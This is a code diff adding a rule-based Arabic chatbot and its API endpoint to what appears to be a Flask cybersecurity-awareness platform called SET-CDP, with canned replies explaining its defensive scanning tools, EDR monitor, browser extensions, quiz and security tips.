+                "كيف أحمي حسابي؟",
+                "ما هي المصادقة الثنائية؟"
+            ]
+        )
+
+    # =====================================================
+    # Greetings
+    # =====================================================
+    if has_any(msg, ["مرحبا", "اهلا", "السلام عليكم", "هاي", "hello", "hi"]):
+        return make_reply(
+            (
+                "أهلاً بك 👋 أنا مساعد SET-CDP. "
+                "يمكنني شرح أدوات الفحص، Mini-EDR، Endpoint Agent، الإضافات، القوالب، الامتحان، ونصائح الحماية."
+            ),
+            "greeting",
+            suggestions=[
+                "ما هي أدوات الفحص؟",
+                "كيف أفحص رابط؟",
+                "ما هو Endpoint Agent؟"
+            ]
+        )
+
+    # =====================================================
+    # About SET-CDP
+    # =====================================================
+    if has_any(msg, ["ما هي set", "ما هي المنصه", "شو هي المنصه", "set-cdp", "عن المشروع", "من نحن", "فكره المشروع"]):
+        return make_reply(
+            (
+                "SET-CDP هي منصة تعليمية في الأمن السيبراني تجمع بين التوعية الأمنية، أدوات الفحص الدفاعي، "
+                "محاكاة التهديدات، الاختبارات التعليمية، إضافات المتصفح، ومراقبة الأجهزة عبر Mini-EDR. "
+                "الهدف منها هو التدريب والفهم العملي داخل بيئة آمنة وأخلاقية."
+            ),
+            "about",
+            quick_links=[
+                {"title": "من نحن", "url": "/about"},
+                {"title": "أدوات الفحص", "url": "/"},
+                {"title": "الإضافات", "url": "/extensions"}
+            ]
+        )
+
+    # =====================================================
+    # Tools Overview
+    # =====================================================
+    if has_any(msg, ["ادوات", "الادوات", "الفحص", "فحص", "scanner", "tools", "شو الادوات"]):
+        return make_reply(
+            (
+                "أدوات الفحص في SET-CDP تشمل: Website Security Scanner، SSL Inspector، URL Safety Checker، "
+                "Header Security Analyzer، Password Analyzer، File Hash Analyzer، Email Phishing Detector، "
+                "URL Expander، ومولد كلمات المرور. بعض الأدوات تعمل محلياً داخل المتصفح لحماية الخصوصية."
+            ),
+            "tools",
+            suggestions=[
+                "كيف أفحص رابط؟",
+                "ما هو SSL؟",
+                "ما هو Header Analyzer؟",
+                "كيف أحلل كلمة مرور؟"
+            ],
+            quick_links=[
+                {"title": "فتح أدوات الفحص", "url": "/"}
+            ]
+        )
+
+    # =====================================================
+    # Website Security Scanner
+    # =====================================================
+    if has_any(msg, ["website scanner", "website security", "فحص موقع", "فحص الموقع", "تقييم موقع", "security score"]):
+        return make_reply(
+            (
+                "Website Security Scanner يفحص مؤشرات أمان الموقع مثل استخدام HTTPS وبعض إعدادات الحماية الأساسية، "
+                "ثم يعطي ملخصاً أو Security Score يساعدك على فهم مستوى الأمان بشكل سريع."
+            ),
+            "website_scanner",
+            quick_links=[
+                {"title": "أدوات الفحص", "url": "/"}
+            ]
+        )
+
+    # =====================================================
+    # SSL
+    # =====================================================
+    if has_any(msg, ["ssl", "شهاده", "شهادة", "https", "certificate", "cert"]):
+        return make_reply(
+            (
+                "SSL Inspector يفحص شهادة الموقع، مثل صلاحية الشهادة، تاريخ الانتهاء، والجهة المصدرة. "
+                "وجود HTTPS وشهادة صالحة لا يعني أن الموقع آمن 100%، لكنه مؤشر مهم لحماية الاتصال بينك وبين الموقع."
+            ),
+            "ssl",
+            suggestions=[
+                "كيف أعرف الرابط المشبوه؟",
+                "ما هو Header Analyzer؟"
+            ]
+        )
+
+    # =====================================================
+    # Header Analyzer
+    # =====================================================
+    if has_any(msg, ["header", "headers", "الهيدر", "الهيدرز", "csp", "hsts", "x-frame", "content security policy"]):
+        return make_reply(
+            (
+                "Header Security Analyzer يفحص ترويسات الحماية في الموقع مثل HSTS و CSP و X-Frame-Options "
+                "و X-Content-Type-Options. هذه الترويسات تساعد في تقليل مخاطر مثل Clickjacking و XSS وبعض الهجمات على المتصفح."
+            ),
+            "headers",
+            quick_links=[
+                {"title": "أدوات الفحص", "url": "/"}
+            ]
+        )
+
+    # =====================================================
+    # URL Safety
+    # =====================================================
+    if has_any(msg, ["رابط", "url", "لينك", "مشبوه", "تصيد", "phishing", "رابط مشبوه"]):
+        return make_reply(
+            (
+                "لفحص الروابط استخدم URL Safety Checker. انتبه إلى الروابط المختصرة، الأخطاء الإملائية في اسم النطاق، "
+                "استخدام HTTP بدل HTTPS، وجود رموز غريبة، أو نطاقات تحاول تقليد مواقع معروفة."
+            ),
+            "url",
+            suggestions=[
+                "ما هو URL Expander؟",
+                "كيف أكتشف التصيد؟"
+            ],
+            quick_links=[
+                {"title": "فحص الروابط", "url": "/"}
+            ]
+        )
+
+    # =====================================================
+    # URL Expander
+    # =====================================================
+    if has_any(msg, ["short url", "shortener", "رابط مختصر", "روابط مختصره", "url expander", "bit.ly", "tinyurl", "فك الرابط"]):
+        return make_reply(
+            (
+                "URL Expander يساعدك على كشف الرابط النهائي خلف الروابط المختصرة مثل bit.ly أو tinyurl. "
+                "هذا مفيد لأن بعض هجمات التصيد تستخدم روابط مختصرة لإخفاء الوجهة الحقيقية."
+            ),
+            "url_expander"
+        )
+
+    # =====================================================
+    # Password Analyzer / Generator
+    # =====================================================
+    if has_any(msg, ["كلمه مرور", "كلمة مرور", "باسورد", "password", "قويه", "قوية", "مولد", "generator"]):
+        return make_reply(
+            (
+                "Password Strength Analyzer يقيّم قوة كلمة المرور محلياً دون حفظها أو إرسالها للسيرفر. "
+                "كلمة المرور الجيدة تكون طويلة، عشوائية، وتحتوي على أحرف كبيرة وصغيرة وأرقام ورموز. "
+                "يمكنك أيضاً استخدام Secure Password Generator لتوليد كلمة قوية."
+            ),
+            "password",
+            suggestions=[
+                "نصائح حماية",
+                "ما هي المصادقة الثنائية؟"
+            ]
+        )
+
+    # =====================================================
+    # File Hash / Metadata
+    # =====================================================
+    if has_any(msg, ["ملف", "hash", "sha", "sha-256", "هاش", "metadata", "pdf", "صوره", "صورة", "file"]):
+        return make_reply(
+            (
+                "File Hash & Metadata Analyzer يحسب بصمة الملف SHA-256 محلياً داخل المتصفح، "
+                "ويمكن استخدام الهاش للتحقق من سلامة الملف أو مقارنته بنسخة موثوقة. "
+                "الفكرة أن الهاش يعرّف الملف دون الحاجة لقراءة محتواه."
+            ),
+            "file"
+        )
+
+    # =====================================================
+    # Email Phishing
+    # =====================================================
+    if has_any(msg, ["ايميل", "email", "رساله", "رسالة", "بريد", "phishing email", "بريد مشبوه"]):
+        return make_reply(
+            (
+                "Email Phishing Detector يفحص نص الرسالة بحثاً عن مؤشرات تصيد مثل الاستعجال، طلب كلمة المرور، "
+                "روابط غريبة، تهديد بإغلاق الحساب، أو عبارات مثل: تحقق من حسابك فوراً. "
+                "دائماً تأكد من المرسل والرابط قبل الضغط."
+            ),
+            "email",
+            suggestions=[
+                "كيف أكتشف التصيد؟",
+                "كيف أفحص رابط؟"
+            ]
+        )
+
+    # =====================================================
+    # Mini-EDR / SOC
+    # =====================================================
+    if has_any(msg, ["edr", "soc", "mini-edr", "mini soc", "monitor", "مراقبه", "مراقبة", "live soc"]):
+        return make_reply(
+            (
+                "Mini-EDR Live Monitor هو جزء دفاعي في SET-CDP يعرض العمليات، الاتصالات، استهلاك الموارد، "
+                "والتنبيهات الأمنية. الهدف منه تعليمي لفهم فكرة المراقبة المركزية والاستجابة الأمنية داخل بيئة مصرح بها."
+            ),
+            "edr",
+            quick_links=[
+                {"title": "Live SOC Monitor", "url": "/edr"},
+                {"title": "Endpoint Devices", "url": "/edr/devices"}
+            ]
+        )
+
+    # =====================================================
+    # Endpoint Agent / Devices
+    # =====================================================
+    if has_any(msg, ["agent", "عميل", "endpoint", "جهاز", "اجهزه", "أجهزة", "devices", "تحميل agent", "heartbeat"]):
+        return make_reply(
+            (
+                "SET-CDP Endpoint Agent هو برنامج تدريبي بسيط يتم تشغيله على الأجهزة المصرح بها لإرسال Heartbeat للسيرفر، "
+                "مثل اسم الجهاز، نظام التشغيل، IP المحلي، CPU وRAM. تظهر هذه الأجهزة في صفحة Endpoint Device Center."
+            ),
+            "agent",
+            quick_links=[
+                {"title": "Endpoint Devices", "url": "/edr/devices"},
+                {"title": "Agent Download", "url": "/edr/download"}
+            ]
+        )
+
+    # =====================================================
+    # Browser Extensions
+    # =====================================================
+    if has_any(msg, ["extension", "extensions", "اضافه", "إضافة", "اضافات", "إضافات", "متصفح", "browser"]):
+        return make_reply(
+            (
+                "متجر إضافات SET-CDP يحتوي على إضافات دفاعية للمتصفح مثل WebShield، CookieShield، وAdShield. "
+                "هذه الإضافات تساعد في فحص الروابط، فهم ملفات الارتباط، تقليل التتبع، وتعزيز وعي المستخدم أثناء التصفح."
+            ),
+            "extensions",
+            suggestions=[
+                "ما هي WebShield؟",
+                "ما هي CookieShield؟",
+                "ما هي AdShield؟"
+            ],
+            quick_links=[
+                {"title": "متجر الإضافات", "url": "/extensions"}
+            ]
+        )
+
+    # WebShield
+    if has_any(msg, ["webshield", "web shield", "ويب شيلد"]):
+        return make_reply(
+            (
+                "WebShield هي إضافة دفاعية تساعد المستخدم على تقييم مخاطر الروابط والصفحات أثناء التصفح، "
+                "وتقدم مؤشرات تحذيرية مثل الروابط المختصرة، HTTP، النطاقات الغريبة، وبعض علامات التصيد."
+            ),
+            "webshield",
+            quick_links=[
+                {"title": "الإضافات", "url": "/extensions"}
+            ]
+        )
+
+    # CookieShield
+    if has_any(msg, ["cookieshield", "cookie shield", "كوكي", "ملفات الارتباط", "cookies"]):
+        return make_reply(
+            (
+                "CookieShield هي إضافة دفاعية تساعد على فهم ملفات الارتباط وتقييم مخاطرها مثل غياب Secure أو HttpOnly أو SameSite. "
+                "الهدف منها تعليمي ودفاعي، ولا تعتمد على عرض أو تسريب القيم الحساسة للكوكيز."
+            ),
+            "cookieshield",
+            suggestions=[
+                "ما هي ملفات الارتباط؟",
+                "كيف أحمي الخصوصية؟"
+            ],
+            quick_links=[
+                {"title": "الإضافات", "url": "/extensions"}
+            ]
+        )
+
+    # AdShield
+    if has_any(msg, ["adshield", "ad shield", "اعلانات", "إعلانات", "تتبع", "tracker", "tracking"]):
+        return make_reply(
+            (
+                "AdShield هي إضافة تساعد على تقليل الإعلانات والتتبع داخل المتصفح، "
+                "وتوضح مفهوم حماية الخصوصية وتقليل الاتصالات غير الضرورية مع جهات التتبع."
+            ),
+            "adshield",
+            quick_links=[
+                {"title": "الإضافات", "url": "/extensions"}
+            ]
+        )
+
+    # =====================================================
+    # Templates / Awareness Simulation
+    # =====================================================
+    if has_any(msg, ["قوالب", "templates", "facebook", "instagram", "linkedin", "university", "محاكاه", "محاكاة"]):
+        return make_reply(
+            (
+                "صفحة القوالب الجاهزة تحتوي على قوالب تدريبية للتوعية بمخاطر الصفحات المزيفة والهندسة الاجتماعية. "
+                "استخدامها يجب أن يكون داخل بيئة تدريبية وبموافقة واضحة، والهدف هو التعليم وليس جمع بيانات حقيقية."
+            ),
+            "templates",
+            quick_links=[
+                {"title": "القوالب الجاهزة", "url": "/ready_templates"}
+            ]
+        )
+
+    # =====================================================
+    # Quiz
+    # =====================================================
+    if has_any(msg, ["امتحان", "quiz", "اختبار", "اسئله", "أسئلة", "نتائج"]):
+        return make_reply(
+            (
+                "قسم الامتحان يستخدم لقياس وعي المستخدمين بالأمن السيبراني. "
+                "يمكن للمستخدم تقديم الامتحان، بينما يستطيع الأدمن إدارة الأسئلة ومراجعة النتائج والتقارير."
+            ),
+            "quiz",
+            quick_links=[
+                {"title": "تقديم الامتحان", "url": "/quiz"},
+                {"title": "لوحة التحكم", "url": "/dashboard"}
+            ]
+        )
+
+    # =====================================================
+    # Dashboard / Reports
+    # =====================================================
+    if has_any(msg, ["dashboard", "لوحه التحكم", "لوحة التحكم", "تقارير", "reports", "سجل", "history", "scans"]):
+        return make_reply(
+            (
+                "لوحة التحكم تعرض سجل الفحوصات والعمليات التعليمية ونتائج المستخدمين حسب الصلاحيات. "
+                "أما التقارير فتساعد الأدمن على متابعة نتائج الاختبارات ونشاط المنصة بشكل منظم."
+            ),
+            "dashboard",
+            quick_links=[
+                {"title": "لوحة التحكم", "url": "/dashboard"},
+                {"title": "التقارير", "url": "/reports"}
+            ]
+        )
+
+    # =====================================================
+    # Threat Library
+    # =====================================================
+    if has_any(msg, ["مكتبه التهديدات", "مكتبة التهديدات", "threat", "threat library", "تهديدات", "مخاطر"]):
+        return make_reply(
+            (
+                "مكتبة التهديدات تعرض أنواعاً مختلفة من المخاطر السيبرانية مع شرح طريقة عملها، "
+                "مستوى خطورتها، وطرق الوقاية منها. وهي جزء مهم من الجانب التوعوي في SET-CDP."
+            ),
+            "threat_library",
+            quick_links=[
+                {"title": "مكتبة التهديدات", "url": "/threat-library"}
+            ]
+        )
+
+    # =====================================================
+    # Privacy / Ethics
+    # =====================================================
+    if has_any(msg, ["خصوصيه", "خصوصية", "اخلاقي", "أخلاقي", "ethics", "privacy", "امان البيانات"]):
+        return make_reply(
+            (
+                "SET-CDP مبنية للاستخدام الأكاديمي والتدريبي فقط. الأدوات الحساسة مثل تحليل كلمة المرور والهاش "
+                "يمكن أن تعمل محلياً داخل المتصفح، والهدف هو التوعية والفحص الدفاعي دون جمع بيانات حقيقية أو استهداف غير مصرح به."
+            ),
+            "privacy_ethics"
+        )
+
+    # =====================================================
+    # Security Tips
+    # =====================================================
+    if has_any(msg, ["نصيحه", "نصيحة", "احمي", "حمايه", "حماية", "safe", "security tips", "نصائح", "2fa", "مصادقه", "مصادقة"]):
+        return make_reply(
+            (
+                "نصائح مهمة: لا تدخل بياناتك في روابط غير موثوقة، تأكد من HTTPS واسم النطاق، فعّل المصادقة الثنائية، "
+                "استخدم كلمات مرور قوية ومختلفة، لا تفتح مرفقات مجهولة، وحدّث النظام والمتصفح باستمرار."
+            ),
+            "tips",
+            suggestions=[
+                "كيف أفحص رابط؟",
+                "كيف أختار كلمة مرور قوية؟",
+                "ما هو SSL؟"
+            ]
+        )
+
+    # =====================================================
+    # Run / Install / GitHub
+    # =====================================================
+    if has_any(msg, ["تشغيل", "run", "github", "تثبيت", "install", "flask", "requirements", "python app"]):
+        return make_reply(
+            (
+                "لتشغيل المشروع: ثبّت المتطلبات من requirements.txt، ثم شغّل app.py، وبعدها افتح المتصفح على "
+                "http://127.0.0.1:5000. تأكد من تهيئة قاعدة البيانات وتسجيل الدخول للوصول للوحة التحكم والأدوات الإدارية."
+            ),
+            "run",
+            suggestions=[
+                "كيف أشغل Agent؟",
+                "أين أجد لوحة التحكم؟"
+            ]
+        )
+
+    # =====================================================
+    # Fallback
+    # =====================================================
+    return make_reply(
+        (
+            "لم أفهم السؤال بشكل كامل، لكن يمكنني مساعدتك في: أدوات الفحص، SSL، فحص الروابط، "
+            "كلمات المرور، تحليل الملفات، Mini-EDR، Endpoint Agent، الإضافات، القوالب، الامتحان، "
+            "مكتبة التهديدات، ونصائح الحماية."
+        ),
+        "fallback",
+        suggestions=[
+            "ما هي SET-CDP؟",
+            "كيف أفحص رابط؟",
+            "ما هو Mini-EDR؟",
+            "ما هي CookieShield؟"
+        ]
+    )
+
+
+@app.route("/api/chatbot", methods=["POST"])
+def api_chatbot():
+    try:
+        client_ip = request.headers.get("X-Forwarded-For", request.remote_addr or "local").split(",")[0].strip()
+
+        if is_rate_limited(client_ip):
+            return jsonify(make_reply(
+                "تم إرسال أسئلة كثيرة خلال وقت قصير. انتظر قليلاً ثم حاول مرة أخرى.",
+                "rate_limit"
+            )), 429
+
+        data = request.get_json(silent=True) or {}
+        message = str(data.get("message", "")).strip()
+
+        # حد أقصى لحجم السؤال للحماية
+        if len(message) > 1000:
+            return jsonify(make_reply(
+                "السؤال طويل جداً. اختصره قليلاً وسأساعدك.",
+                "limit"
+            )), 400
+
+        result = chatbot_reply(message)
+        return jsonify(result)
+
+    except Exception as e:
+        return jsonify(make_reply(
+            "حدث خطأ أثناء معالجة السؤال. حاول مرة أخرى.",
+            "error"
+        )), 500
+# ==================== MAIN EXECUTION ====================
 if __name__ == '__main__':
     print('SET-CDP running at http://127.0.0.1:5000')
     app.run(debug=True, host='127.0.0.1', port=5000)
